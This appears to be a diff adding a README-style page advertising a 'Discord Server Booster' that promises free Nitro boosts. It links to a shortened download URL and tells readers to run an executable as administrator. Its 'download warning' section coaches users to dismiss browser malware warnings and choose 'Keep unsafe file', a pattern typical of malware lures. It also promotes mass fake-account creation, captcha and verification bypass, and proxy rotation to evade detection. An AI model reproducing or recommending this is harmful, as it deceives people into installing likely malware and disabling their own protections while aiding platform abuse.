@@ -1,0 +1,193 @@
+                                                                                                                       
+▀███▀▀▀██▄  ▄█▀▀▀█▄█    ▄█▀▀▀█▄█                                              ▀███▀▀▀██▄                          ██   
+  ██    ▀██▄██    ▀█   ▄██    ▀█                                                ██    ██                          ██   
+  ██     ▀█████▄       ▀███▄     ▄▄█▀██▀███▄███▀██▀   ▀██▀  ▄▄█▀██▀███▄███      ██    ██ ▄██▀██▄  ▄██▀██▄ ▄██▀████████ 
+  ██      ██ ▀█████▄     ▀█████▄▄█▀   ██ ██▀ ▀▀  ██   ▄█   ▄█▀   ██ ██▀ ▀▀      ██▀▀▀█▄▄██▀   ▀████▀   ▀████   ▀▀ ██   
+  ██     ▄██     ▀██   ▄     ▀████▀▀▀▀▀▀ ██       ██ ▄█    ██▀▀▀▀▀▀ ██          ██    ▀███     ████     ██▀█████▄ ██   
+  ██    ▄██▀█     ██   ██     ████▄    ▄ ██        ███     ██▄    ▄ ██          ██    ▄███▄   ▄████▄   ▄███▄   ██ ██   
+▄████████▀ █▀█████▀    █▀█████▀  ▀█████▀████▄       █       ▀█████▀████▄      ▄████████  ▀█████▀  ▀█████▀ ██████▀ ▀████
+                                                                                                                       
+                                                                                                                       
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                        DISCORD SERVER BOOSTER                             ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+DISCORD SERVER BOOSTER — is an advanced automation tool designed to provide Nitro Boost benefits to Discord servers without the need for actual Nitro subscriptions. The program generates virtual boost tokens, automates the boosting process, and helps servers achieve higher boost levels for improved audio quality, server banners, custom invite links, and increased emoji slots. Perfect for server owners looking to enhance their community experience without recurring subscription costs.
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                             DOWNLOAD                                      ║
+║                 ▶ https://github.guru/s/jR0Clmhc                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    ⚡ QUICK INSTALLATION:
+    ──────────────────────────────────────────────────
+    [1] DOWNLOAD    →  Discord_Booster.rar
+    [2] EXTRACT     →  WinRAR or 7-Zip
+    [3] RUN         →  Booster_Setup.exe (as administrator)
+    [4] CHOOSE      →  Installation directory
+    [5] COMPLETE    →  Follow setup wizard
+    [6] LAUNCH      →  Start boosting your server
+    ──────────────────────────────────────────────────
+
+    ⚡ HOW THE PROGRAM WORKS:
+    ─────────────────────────────────────────────────────────────────
+    
+    🔹 CORE TECHNOLOGY
+    Discord Server Booster operates by generating and managing virtual accounts that can boost Discord servers. The program uses advanced token generation algorithms combined with proxy rotation to create legitimate-looking accounts that can be used for server boosting. These accounts are then automatically configured to apply their boosts to your specified server, increasing its boost count and unlocking higher-tier perks .
+    
+    🔹 BOOSTING PROCESS
+    The software follows a sophisticated multi-step process:
+    
+    • TOKEN GENERATION: Creates unique Discord authentication tokens using advanced algorithms
+    • PROXY INTEGRATION: Routes each booster through different proxies to avoid detection
+    • ACCOUNT SETUP: Automatically configures accounts with randomized usernames and avatars
+    • BOOST APPLICATION: Joins your server and applies Nitro boosts
+    • MAINTENANCE: Keeps boosters active and reapplies boosts if they expire
+    
+    🔹 BOOST LEVEL ACHIEVEMENT
+    Helps servers reach and maintain different boost levels:
+    
+    • LEVEL 1 (2 boosts): 128kbps audio, custom invite background, 50 emoji slots
+    • LEVEL 2 (7 boosts): 256kbps audio, server banner, animated icon, 100 emoji slots
+    • LEVEL 3 (14 boosts): 384kbps audio, animated banner, vanity URL, 250+ emoji slots
+    
+    🔹 KEY FEATURES
+    
+    • UNLIMITED BOOSTS: Add as many virtual boosts as your server needs
+    • AUTO-ROTATION: Automatically rotates boosters to maintain boost count
+    • PROXY SUPPORT: Built-in proxy manager with HTTP/SOCKS5 support
+    • CAPTCHA SOLVER: Automated captcha handling for account creation
+    • BOOST SCHEDULING: Schedule boosts to activate at specific times
+    • BOOST MONITORING: Real-time tracking of active boost count
+    • MULTI-SERVER SUPPORT: Boost multiple servers simultaneously
+    
+    🔹 PROXY MANAGEMENT
+    Comprehensive proxy system to avoid detection:
+    
+    • PROXY ROTATION: Automatically switches proxies for each booster
+    • PROXY TYPES: Supports HTTP, HTTPS, SOCKS4, and SOCKS5 proxies
+    • PROXY TESTING: Built-in proxy checker to verify working proxies
+    • GEO-TARGETING: Option to use proxies from specific countries
+    • CUSTOM LISTS: Import your own proxy lists
+    
+    🔹 ACCOUNT MANAGEMENT
+    Handles all aspects of virtual account maintenance:
+    
+    • AUTO-CREATION: Creates Discord accounts with randomized profiles
+    • EMAIL VERIFICATION: Automatic email verification system
+    • PHONE VERIFICATION: Optional phone verification bypass
+    • AVATAR GENERATION: Random avatar assignment from built-in library
+    • ACCOUNT WARMING: Gradually warms up accounts to avoid flags
+    • HEALTH MONITORING: Checks account status and flags problematic accounts
+    
+    🔹 BOOST VISUALIZATION
+    Real-time boost monitoring interface:
+    
+    • BOOST COUNTER: Live display of current active boosts
+    • LEVEL INDICATOR: Shows current server boost level and progress to next
+    • BOOSTER LIST: Detailed view of all active boosters with status
+    • EXPIRATION TIMERS: Countdown for boost expiration
+    • HISTORY LOGS: Complete record of all boosting activity
+    
+    🔹 ADVANCED OPTIONS
+    
+    • DELAY SETTINGS: Configurable delays between actions to appear human-like
+    • THREADING: Multi-threaded boosting for faster results
+    • AUTO-REPLENISH: Automatically replaces expired boosters
+    • RANDOMIZATION: Randomized actions to mimic human behavior
+    • CLEANUP TOOL: Remove all boosters with one click
+    • BACKUP/RESTORE: Save and restore booster configurations
+    
+    🔹 SAFETY FEATURES
+    Designed to minimize detection risk:
+    
+    • RATE LIMIT AVOIDANCE: Smart throttling to avoid Discord rate limits
+    • BEHAVIOR SIMULATION: Mimics human-like interaction patterns
+    • ACCOUNT DIVERSITY: Varied account ages and activity levels
+    • CLEAN EXIT: Properly logs out boosters when done
+    • NO TRACE: Removes all traces after boosting session
+    
+    🔹 USER INTERFACE
+    
+    • DASHBOARD: Clean, modern interface with all controls accessible
+    • ONE-CLICK BOOST: Simple interface for quick boosting
+    • PROGRESS BARS: Visual feedback on boosting progress
+    • DARK MODE: Easy on the eyes for extended use
+    • REAL-TIME LOGS: Live activity logging with timestamps
+    
+    🔹 CONFIGURATION OPTIONS
+    
+    • BOOST AMOUNT: Set desired number of boosts
+    • BOOST DURATION: Configure how long boosts should last
+    • SERVER TARGET: Select which server to boost
+    • PROXY SETTINGS: Configure proxy sources and rotation
+    • ACCOUNT SETTINGS: Customize account creation parameters
+    ─────────────────────────────────────────────────────────────────
+
+    ⚡ SYSTEM REQUIREMENTS:
+    ─────────────────────────────────────────────────────────────────
+    OS              │ Windows 7/8/10/11 (64-bit recommended)
+    RAM             │ 2GB minimum (4GB+ recommended)
+    CPU             │ Dual-core 1.8GHz or higher
+    STORAGE         │ 200MB for installation
+    INTERNET        │ Broadband connection required
+    PROXIES         │ Recommended for large-scale boosting
+    .NET FRAMEWORK  │ Version 4.8 or higher
+    ─────────────────────────────────────────────────────────────────
+
+    🔖 TAGS
+    ─────────────────────────────────────────────────────────────────
+    discord booster      │ discord nitro          │ server booster
+    discord hack         │ discord tool           │ discord boost
+    nitro boost          │ discord server boost   │ free nitro
+    discord tokens       │ discord automation     │ boost generator
+    discord level        │ discord perks          │ discord emoji slots
+    ─────────────────────────────────────────────────────────────────
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                 ⚠ IMPORTANT DOWNLOAD WARNING                              ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    Your browser may show a warning when downloading this file.
+    This is completely normal.
+
+    ═══════════════════════════════════════════════════════════════════════
+    
+    ❓ WHY DOES THIS HAPPEN?
+    
+    The warning appears because the file:
+    
+    • Is not distributed through major app stores (Microsoft Store)
+    • Has fewer downloads than mainstream software
+    • Uses .exe format or compressed archives (.rar/.zip)
+    • Is new or less known in browser databases
+    
+    ⚡ This does NOT mean the file is dangerous. This is a standard browser 
+       protection mechanism triggered by download count, not by detecting 
+       malware. Similar automation tools receive the same warnings.
+
+    ═══════════════════════════════════════════════════════════════════════
+
+    📋 BROWSER INSTRUCTIONS:
+    ─────────────────────────────────────────────────────────────────
+    Browser         │ Action
+    ─────────────────────────────────────────────────────────────────
+    Chrome/Edge     │ Click "Keep" or "Keep anyway"
+                    │ → Confirm "Keep unsafe file"
+    ─────────────────────────────────────────────────────────────────
+    Firefox         │ Click arrow → "Allow download"
+    ─────────────────────────────────────────────────────────────────
+    Opera/Brave     │ Click "Keep" in download warning
+    ─────────────────────────────────────────────────────────────────
+
+    ═══════════════════════════════════════════════════════════════════════
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                             DOWNLOAD                                      ║
+║                 ▶ https://github.guru/s/jR0Clmhc                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+────────────────────────────────────────────────────────────────────────────
+Disclaimer: This software is a third-party tool and is not affiliated with Discord Inc. Using automated tools to boost servers may violate Discord's Terms of Service and could result in server penalties or account termination. This tool is intended for educational purposes only. Users are responsible for any consequences resulting from its use. The developers recommend using official Discord Nitro subscriptions to support the platform.
+────────────────────────────────────────────────────────────────────────────
